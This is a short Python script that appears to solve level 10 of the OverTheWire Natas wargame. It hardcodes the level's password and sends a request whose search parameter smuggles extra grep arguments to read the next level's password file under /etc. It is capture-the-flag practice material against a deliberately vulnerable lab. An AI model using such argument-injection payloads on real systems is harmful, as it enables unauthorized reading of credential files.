import requests

username = "natas10"
password = "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu"

url = "http://%s.natas.labs.overthewire.org?needle=-E . /etc/natas_webpass/natas11" % username
session = requests.Session()

response = session.get(url, auth = (username,password))


print(response.text)